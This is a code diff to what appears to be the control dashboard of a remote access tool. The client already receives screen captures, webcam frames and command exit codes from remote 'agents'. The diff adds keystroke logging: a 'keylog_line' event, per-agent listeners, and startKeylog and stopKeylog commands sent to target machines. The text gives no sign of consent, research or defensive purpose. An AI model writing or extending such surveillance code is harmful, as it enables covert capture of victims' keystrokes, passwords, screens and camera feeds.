@@ -6,6 +6,7 @@ type DashboardEvent =
   | { type: 'exit'; agent_id: string; exit_code: number }
   | { type: 'screen_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number }
   | { type: 'camera_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number }
+  | { type: 'keylog_line'; agent_id?: string; line: string }
   | { type: 'error'; message: string };
 
 class DashboardSocket {
@@ -20,6 +21,7 @@ class DashboardSocket {
   private pending: { target: string; command?: string; payload?: any }[] = [];
   private screenListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
   private cameraListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
+  private keylogListeners: { [agentId: string]: ((line: string) => void)[] } = {};
 
   setToken(token: string | null) {
     this.token = token;
@@ -73,6 +75,11 @@ class DashboardSocket {
           const d = data as { type: 'camera_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number };
           const cbs = this.cameraListeners[d.agent_id] || [];
           cbs.forEach((cb) => cb({ data: d.data, w: d.w, h: d.h, ts: d.ts }));
+        } else if ((data as any).type === 'keylog_line') {
+          const d = data as { type: 'keylog_line'; agent_id?: string; line: string };
+          const aid = d.agent_id || this.currentAgentIdForKeylog();
+          const cbs = (aid && this.keylogListeners[aid]) ? this.keylogListeners[aid] : [];
+          cbs.forEach((cb) => cb(d.line));
         }
       } catch (e) {
         // ignore parse error
@@ -89,6 +96,8 @@ class DashboardSocket {
     this.agentsListeners.push(cb);
     if (this.agents.length) cb([...this.agents]);
   }
+
+  private currentAgentIdForKeylog(): string | null { return (this.agents[0]?.agent_id) || null; }
 
   onStatus(cb: (status: 'connected' | 'disconnected') => void) {
     this.statusListeners.push(cb);
@@ -265,6 +274,26 @@ class DashboardSocket {
     this.ws.send(JSON.stringify({ target: agentId, ...payload }));
   }
 
+  onKeylog(agentId: string, cb: (line: string) => void) {
+    if (!this.keylogListeners[agentId]) this.keylogListeners[agentId] = [];
+    this.keylogListeners[agentId].push(cb);
+  }
+
+  offKeylog(agentId: string, cb: (line: string) => void) {
+    this.keylogListeners[agentId] = (this.keylogListeners[agentId] || []).filter((f) => f !== cb);
+  }
+
+  startKeylog(agentId: string) {
+    const payload = { type: 'keylog_start' };
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
+  }
+
+  stopKeylog(agentId: string) {
+    const payload = { type: 'keylog_stop' };
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
+  }
 }
 
 export const dashboardSocket = new DashboardSocket();
